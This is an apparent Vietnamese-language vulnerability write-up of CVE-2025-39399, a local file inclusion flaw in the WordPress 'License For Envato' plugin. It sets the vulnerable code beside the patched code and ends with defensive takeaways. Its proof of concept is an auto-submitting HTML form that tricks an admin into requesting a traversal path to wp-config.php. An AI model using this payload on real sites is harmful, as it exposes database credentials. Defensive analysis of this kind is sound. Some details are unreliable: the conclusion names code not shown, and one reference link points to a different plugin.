# CVE-2025-39399 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **License For Envato** phiên bản **≤ 1.0.0** chứa lỗ hổng **Local File Inclusion** cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh `include/require`, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.

* **CVE ID**: [CVE-2025-39399](https://www.cve.org/CVERecord?id=CVE-2025-39399)
* **Vulnerability Type**: Local File Inclusion
* **Affected Versions**: <= 1.0.0
* **Patched Versions**: 1.1.0
* **CVSS severity**: High (7.5)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress License For Envato Plugin](https://wordpress.org/plugins/license-envato/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **License For Envato**: **1.0.0** (vulnerable) và **1.1.0** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.

## Analysis

### Patch diff

**Bản lỗi**:

```phtml {filename="settingsView.php v1.0.0" hl_lines=[2, 8, 12]}
<div class="wrap">
    <?php $action = isset( $_GET['tab'] ) ? sanitize_text_field( $_GET['tab'] ) : 'general'; ?>
    // other logic
    <?php
    $dir = __DIR__;
    $licenseEnvato_nav_view =  apply_filters( 'license_envato_settings_view', $dir, $action );

    if ($licenseEnvato_nav_view) {
        $template = "{$licenseEnvato_nav_view}/{$action}.php";
    }

    if ( file_exists( $template ) ) {
        include $template;
    }else{
        include "{$licenseEnvato_nav_view}/general.php";
    }
    ?>
</div>
```

Trong phiên bản lỗi, giá trị của biến `$action` được lấy trực tiếp từ tham số `$_GET['tab']`. Mặc dù biến này được xử lý qua hàm [`sanitize_text_field()`](https://developer.wordpress.org/reference/functions/sanitize_text_field/), hàm này chỉ loại bỏ thẻ HTML - **chứ không ngăn chặn các chuỗi traversal như `../`**.

Do đó, attacker có thể truyền vào một giá trị như `?tab=../../somefile`, khiến `$action` chứa đường dẫn ngoài mong đợi. Khi biến này được nối vào `$template` và sau đó được `include` => Xảy ra LFI.

**Bản vá**:

```phtml {filename="settingsView.php v1.1.0" hl_lines=[6,14,18,33,34,37]}
<?php
// Exit if accessed directly
defined('ABSPATH') || exit;

// Define allowed tab values to prevent LFI
$allowed_tabs = array('general', 'envato');
// Apply filter to allow extensions to add their own tabs
$allowed_tabs = apply_filters('license_envato_allowed_tabs', $allowed_tabs);

// Verify nonce if tab parameter is set
$action = 'general';
if (isset($_GET['tab'])) {
    // Verify nonce for tab switching if provided
    if (isset($_GET['_wpnonce']) && wp_verify_nonce(sanitize_text_field(wp_unslash($_GET['_wpnonce'])), 'license_envato_switch_tab')) {
        $tab = sanitize_text_field(wp_unslash($_GET['tab']));
        // Only allow values from the whitelist
        $action = in_array($tab, $allowed_tabs) ? $tab : 'general';
    } elseif (!isset($_GET['_wpnonce'])) {
        // If no nonce is provided, still allow tab switching but sanitize input
        $tab = sanitize_text_field(wp_unslash($_GET['tab']));
        // Only allow values from the whitelist
        $action = in_array($tab, $allowed_tabs) ? $tab : 'general';
    }
}
?>
<div class="wrap">
    <?php
    $dir = __DIR__;
    $licenseEnvato_nav_view =  apply_filters( 'license_envato_settings_view', $dir, $action );

    if ($licenseEnvato_nav_view) {
        // Ensure we only include files within the plugin directory structure
        $template = realpath("{$licenseEnvato_nav_view}/{$action}.php");
        $nav_view_dir = realpath($licenseEnvato_nav_view);
        
        // Verify the template is a child of the nav view directory to prevent path traversal
        if ($template && $nav_view_dir && strpos($template, $nav_view_dir) === 0 && file_exists($template)) {
            include $template;
        } else {
            // Fallback to general.php with the same security checks
            $general_template = realpath("{$licenseEnvato_nav_view}/general.php");
            if ($general_template && strpos($general_template, $nav_view_dir) === 0) {
                include $general_template;
            }
        }
    }
    ?>
</div>
```

Bản vá đã thực hiện nhiều biện pháp để ngăn chặn lỗ hổng **LFI** và củng cố tính bảo mật của phần xử lý tham số tab:

1. Sử dụng whitelist `$allowed_tabs`

```php
$allowed_tabs = array('general', 'envato');
$allowed_tabs = apply_filters('license_envato_allowed_tabs', $allowed_tabs);
```

2. Kiểm tra nonce chống CSRF 

```php
if (isset($_GET['_wpnonce']) && wp_verify_nonce(..., 'license_envato_switch_tab'))
```

Lý do CVE được gán là **Unauthenticated** là vì kẻ tấn công không cần tài khoản riêng trên site mục tiêu để khai thác. Kỹ thuật phổ biến là lừa một admin (hoặc người có quyền) truy cập trang web chứa payload. Khi admin mở trang đó, trình duyệt sẽ gửi yêu cầu tới site WordPress kèm cookie phiên đang còn hiệu lực - do đó yêu cầu được coi là đã xác thực là từ admin. Nếu plugin nhận và thực thi tham số mà không kiểm tra nonce hoặc quyền truy cập, payload LFI sẽ được xử lý và dẫn tới lỗ hổng.

3. Chuẩn hóa và kiểm tra đường dẫn bằng [`realpath()`](https://www.php.net/manual/en/function.realpath.php)

```php
$template = realpath("{$licenseEnvato_nav_view}/{$action}.php");
$nav_view_dir = realpath($licenseEnvato_nav_view);
```

### Vulnerable Code 

```php {filename="Settings.php" hl_lines=[5]}
public function plugin_page() {
    $license_envato_api = new EnvatoLicenseApiCall();
    $settingsView = __DIR__ . '/views/settingsView.php';
    if ( file_exists( $settingsView ) ) {
        include $settingsView;
    }
}
```

`settingsView.php` luôn tồn tại trong mã nguồn nên chắc chắn được `include` trong hàm `plugin_page()`

```php {filename="Menu.php" hl_lines=[3]}
public function admin_menu() {
    $parent_slug = 'licenseenvato';
    $capability = 'manage_options';

    add_submenu_page( $parent_slug, __( 'Settings', 'licenseenvato' ), __( 'Settings', 'licenseenvato' ), $capability, $parent_slug.'-settings', [ $this, 'settings' ] );
}

public function settings() {
    $settings = new Settings();
    $settings->plugin_page();
}
```

`plugin_page()` được gọi thông qua callback của submenu “Settings”, được đăng ký trong hàm `admin_menu()`.

Submenu này có quyền truy cập `manage_options`, nên chỉ hiển thị với admin. Khi admin mở trang con `“Settings”` (endpoint `licenseenvato-settings`), WordPress sẽ gọi `settings()`, từ đó khởi tạo lớp `Settings` và chạy `plugin_page()`.

## Exploit
### Proof of Concept (PoC)

#### Step 1

Tạo trang web chứa LFI payload

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>w41bu1</title>
</head>
<body>
    <form action="http://localhost/wp-admin/admin.php" method="get">
        <input type="text" name="page" value="licenseenvato-settings">
        <input type="text" name="tab" value="../../../../../../wp-config">
    </form>
    <script>
        document.forms[0].submit()
    </script>
</body>
</html>
```

#### Step 2

Gửi link đến trang web cho admin

**Result**:

Debugger đã nhảy đến `wp-config.php`

{{< figure src="result.png" caption="Kết quả LFI thành công" >}}

## Conclusion

Phiên bản **≤ 1.0.0** của License For Envato cho phép LFI vì `include()` dùng `$atts['template']` chưa được xác thực; lỗ hổng đã được vá trong **1.1.0** bằng `basename()` + `realpath()` và kiểm tra `base_dir`.

## Key takeaways

* Việc **chỉ dùng `sanitize_text_field()` không đủ** để ngăn chặn path traversal trong PHP.
* Mọi tham số được dùng trong `include()` hoặc thao tác file **phải được kiểm soát bằng whitelist hoặc `realpath()`**.
* **CSRF kết hợp LFI** có thể biến lỗ hổng dành cho admin thành lỗ hổng **unauthenticated**, nếu thiếu kiểm tra nonce.
* Cần **kiểm tra kỹ input và giới hạn phạm vi file có thể truy cập**, đặc biệt trong các plugin xử lý template hoặc view.
* Luôn xác thực và ràng buộc đường dẫn khi include file - không bao giờ tin tưởng dữ liệu từ request, dù đã “sanitize”.

## References

[File Inclusion/Path traversal — Hacktrick](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols)

[ WordPress License For Envato Plugin <= 1.0.0 is vulnerable to Local File Inclusion ](https://patchstack.com/database/wordpress/plugin/subscribe-to-download-lite/vulnerability/wordpress-subscribe-to-download-lite-plugin-1-2-9-local-file-inclusion-vulnerability?_s_id=cve)

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-10-17-cve-2025-39399/  

